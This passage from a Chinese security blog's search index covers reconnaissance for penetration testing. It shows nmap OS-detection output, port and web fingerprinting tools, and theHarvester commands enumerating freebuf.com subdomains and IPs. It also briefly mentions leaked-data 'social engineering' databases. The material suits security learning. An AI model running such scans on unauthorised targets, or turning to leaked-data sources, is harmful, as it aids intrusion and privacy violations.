class="line">OS:A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=</span><br><span class="line">OS:Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%</span><br><span class="line">OS:T=40%CD=S)</span><br><span class="line"></span><br><span class="line">Uptime guess: 22.103 days (since Fri Mar 19 11:30:10 2021)</span><br><span class="line">Network Distance: 0 hops</span><br><span class="line">TCP Sequence Prediction: Difficulty=262 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">NSE: Script Post-scanning.</span><br><span class="line">Initiating NSE at 13:58</span><br><span class="line">Completed NSE at 13:58, 0.00s elapsed</span><br><span class="line">Initiating NSE at 13:58</span><br><span class="line">Completed NSE at 13:58, 0.00s elapsed</span><br><span class="line">Initiating NSE at 13:58</span><br><span class="line">Completed NSE at 13:58, 0.00s elapsed</span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 12.35 seconds</span><br><span class="line">           Raw packets sent: 65645 (2.892MB) | Rcvd: 131283 (5.520MB)</span><br></pre></td></tr></table></figure><ul><li><h3 id="御剑端口扫描">御剑端口扫描</h3></li></ul><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210410140753.png" alt="image-20210410140746650"></p><h2 id="WEB信息探测">WEB信息探测</h2><p><a href="https://yunsee.cn">云悉</a></p><ul><li>御剑web指纹扫描工具</li><li>InsightScan</li><li>HBSV</li></ul><h2 id="邮箱信息搜集">邮箱信息搜集</h2><ul><li><h3 id="theHarvester">theHarvester</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># theHarvester -d freebuf.com -b baidu                                                               2 ⨯</span></span><br><span class="line"></span><br><span class="line">*******************************************************************</span><br><span class="line">*  _   _                                            _             *</span><br><span class="line">* | |_| |__   ___    /\  /\__ _ _ ____   _____  ___| |_ ___ _ __  *</span><br><span class="line">* | __|  _ \ / _ \  / /_/ / _` | <span class="string">&#x27;__\ \ / / _ \/ __| __/ _ \ &#x27;</span>__| *</span><br><span class="line">* | |_| | | |  __/ / __  / (_| | |   \ V /  __/\__ \ ||  __/ |    *</span><br><span class="line">*  \__|_| |_|\___| \/ /_/ \__,_|_|    \_/ \___||___/\__\___|_|    *</span><br><span class="line">*                                                                 *</span><br><span class="line">* theHarvester 3.2.3                                              *</span><br><span class="line">* Coded by Christian Martorella                                   *</span><br><span class="line">* Edge-Security Research                                          *</span><br><span class="line">* cmartorella@edge-security.com                                   *</span><br><span class="line">*                                                                 *</span><br><span class="line">*******************************************************************</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Target: freebuf.com</span><br><span class="line"></span><br><span class="line">[*] Searching Baidu.</span><br><span class="line"></span><br><span class="line">[*] No IPs found.</span><br><span class="line"></span><br><span class="line">[*] No emails found.</span><br><span class="line"></span><br><span class="line">[*] Hosts found: 8</span><br><span class="line">---------------------</span><br><span class="line">bar.freebuf.com:60.205.171.29</span><br><span class="line">company.freebuf.com:60.205.171.29</span><br><span class="line">job.freebuf.com:60.205.171.29</span><br><span class="line">live.freebuf.com:60.205.171.29</span><br><span class="line">my.freebuf.com:60.205.171.29</span><br><span class="line">search.freebuf.com:60.205.171.29</span><br><span class="line">shop.freebuf.com:60.205.171.29</span><br><span class="line">www.freebuf.com:60.205.171.29</span><br><span class="line"></span><br><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># theHarvester -d dansemal.github.io -b baidu</span></span><br><span class="line"></span><br><span class="line">*******************************************************************</span><br><span class="line">*  _   _                                            _             *</span><br><span class="line">* | |_| |__   ___    /\  /\__ _ _ ____   _____  ___| |_ ___ _ __  *</span><br><span class="line">* | __|  _ \ / _ \  / /_/ / _` | <span class="string">&#x27;__\ \ / / _ \/ __| __/ _ \ &#x27;</span>__| *</span><br><span class="line">* | |_| | | |  __/ / __  / (_| | |   \ V /  __/\__ \ ||  __/ |    *</span><br><span class="line">*  \__|_| |_|\___| \/ /_/ \__,_|_|    \_/ \___||___/\__\___|_|    *</span><br><span class="line">*                                                                 *</span><br><span class="line">* theHarvester 3.2.3                                              *</span><br><span class="line">* Coded by Christian Martorella                                   *</span><br><span class="line">* Edge-Security Research                                          *</span><br><span class="line">* cmartorella@edge-security.com                                   *</span><br><span class="line">*                                                                 *</span><br><span class="line">*******************************************************************</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Target: dansemal.github.io</span><br><span class="line"></span><br><span class="line">[*] Searching Baidu.</span><br><span class="line"></span><br><span class="line">[*] No IPs found.</span><br><span class="line"></span><br><span class="line">[*] No emails found.</span><br><span class="line"></span><br><span class="line">[*] No hosts found.</span><br></pre></td></tr></table></figure></li><li><p>社工库</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息搜集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息搜集 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
